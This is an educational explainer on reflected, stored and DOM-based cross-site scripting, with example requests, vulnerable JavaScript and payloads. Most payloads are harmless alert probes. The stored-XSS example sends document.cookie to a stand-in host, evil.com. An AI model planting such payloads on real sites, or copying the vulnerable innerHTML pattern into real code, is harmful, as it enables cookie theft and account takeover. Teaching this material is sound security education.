## Types of xss :
There are **three main types** of Cross-Site Scripting (XSS) attacks:

1. Reflected XSS (Non-Persistent)
2. Stored XSS (Persistent)
3. DOM-Based XSS (Client-Side Only)

Each type works differently based on **how the payload is delivered**, **where it is executed**, and **whether the server or the browser is vulnerable**.

---

## 1. Reflected XSS (Non-Persistent)

### Description:

* The malicious script is **reflected** (bounced back) by the server **immediately** in the response.
* The input comes from the **HTTP request** (URL, headers, form input) and is used directly in the response without proper sanitization.
* **Not stored** anywhere on the server.
* The attack works **only if the victim clicks a crafted link** or is tricked into submitting a malicious request.

### How it works:

1. The attacker crafts a malicious URL with a script in the query string or form data.
2. The victim clicks the link.
3. The server reflects the script in the response (e.g., in HTML or a message).
4. The victim’s browser executes the script.

### Example:

```http
GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: example.com
```

If the server responds with:

```html
You searched for: <script>alert(1)</script>
```

...then the browser executes the alert.

### Characteristics:

* Temporary — works only for one request.
* Requires **user interaction** (click or form submission).
* Often found in:

  * Search results
  * Error pages
  * Form feedback
  * URL previews

---

## 2. Stored XSS (Persistent)

### Description:

* The malicious script is **permanently stored** on the server.
* Usually injected into **databases, comment sections, user profiles, forums, etc.**
* When other users load the page, the malicious script is served as part of the normal content.
* This means the attack is **automatically triggered** without any user action.

### How it works:

1. The attacker submits a script (e.g., in a comment or profile bio).
2. The application stores the script in its backend (database, file, etc.).
3. When another user visits that page, the stored script is sent as part of the HTML.
4. The victim’s browser executes the attacker’s script automatically.

### Example:

An attacker posts the following comment:

```html
Great article! <script>fetch('http://evil.com?cookie=' + document.cookie)</script>
```

When anyone visits that blog post, their browser executes the script and sends their cookies to the attacker.

### Characteristics:

* **No user interaction needed** after the initial injection.
* **High impact**, especially on pages that get viewed by many users (like admin panels).
* Common in:

  * Forums
  * Blog comments
  * Profile pages
  * Chat messages

---

## 3. DOM-Based XSS

### Description:

* The vulnerability exists in **client-side JavaScript**, not the server.
* The server might be completely innocent — it just delivers a static page.
* The attack happens when JavaScript on the page **reads untrusted data (from URL, cookies, or input)** and inserts it into the DOM **without proper sanitization or escaping**.

### How it works:

1. The attacker creates a URL with a payload in the hash (`#`), query string (`?`), or another client-side source.
2. The page’s JavaScript reads this value and inserts it into the page using `innerHTML`, `document.write`, etc.
3. The browser executes the inserted script.

### Example:

Imagine the site contains this JavaScript:

```javascript
var name = location.hash.substring(1);
document.getElementById("output").innerHTML = "Hello " + name;
```

Now visit:

```
https://example.com/#<img src=x onerror=alert(1)>
```

The result will be:

```html
Hello <img src=x onerror=alert(1)>
```

...which triggers an alert when the image fails to load.

### Characteristics:

* **No server involvement** in the injection or execution.
* Harder to detect because scanning tools may only look at server responses.
* Very common in modern **JavaScript-heavy applications** (e.g., React, Angular, SPAs).
* Vulnerable functions include:

  * `innerHTML`
  * `document.write`
  * `eval`
  * `setTimeout`/`setInterval` with strings

---

## Summary

| Type      | Description                                                                 |
| --------- | --------------------------------------------------------------------------- |
| Reflected | Script comes from user input and is reflected back in the same request.     |
| Stored    | Script is saved in the backend and shown to all users who load the page.    |
| DOM-Based | Script is injected via the frontend, using JS that handles untrusted input. |

